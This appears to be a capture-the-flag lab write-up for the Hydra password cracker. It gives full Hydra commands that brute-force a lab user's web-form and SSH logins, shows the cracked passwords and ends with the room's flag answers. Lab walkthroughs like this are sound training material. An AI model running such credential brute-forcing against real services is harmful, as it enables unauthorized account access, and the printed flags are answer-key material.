# Hydra
Learn about and use Hydra, a fast network logon cracker, to bruteforce and obtain a website's credentials.

## Taks

### Use Hydra to bruteforce molly's web password. What is flag 1?

``` html
	<form class="form-signin" action="/login" method="post">
      <a href='/'><img class="mb-4" style='width: 200px;' src="/img/herc.gif" alt=""></a>
      <h1 class="h3 mb-3 font-weight-normal">Login</h1>
      
      <label for="inputEmail" class="sr-only">Username</label>
      <input type="text" name="username" class="form-control" placeholder="Username" required autofocus>
      <label for="inputPassword" class="sr-only">Password</label>
      <input type="password" name="password" class="form-control" placeholder="Password" required>
      <button class="btn btn-lg btn-primary btn-block" type="submit">Login</button>
      <p class="mt-5 mb-3 text-muted">&copy; HydraSite 2012 - 2020</p>
    </form>
```


hydra -l molly -P rockyou.txt 10.10.39.27 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect" -V


[80][http-post-form] host: 10.10.39.27   login: molly   password: sunshine

1 of 1 target successfully completed, 1 valid password found


THM{2673a7dd116de68e85c48ec0b1f2612e}

### Use Hydra to bruteforce molly's SSH password. What is flag 2?

hydra -l molly -P rockyou.txt 10.10.39.27 -t 4 ssh -v


linux@ubuntu:~/Documents/wordlists$ hydra -l molly -P rockyou.txt 10.10.39.27 -t                                                4 ssh -v
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret                                                service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-07-01 21:01:                                               13
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344398 login tries (l:1/p:14                                               344398), ~3586100 tries per task
[DATA] attacking ssh://10.10.39.27:22/
[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
[INFO] Testing if password authentication is supported by ssh://molly@10.10.39.2                                               7:22
[INFO] Successful, password authentication is supported by ssh://10.10.39.27:22
[22][ssh] host: 10.10.39.27   login: molly   password: butterfly
[STATUS] attack finished for 10.10.39.27 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found


molly@ip-10-10-39-27:~$ cat flag2.txt

THM{c8eeb0468febbadea859baeb33b2541b}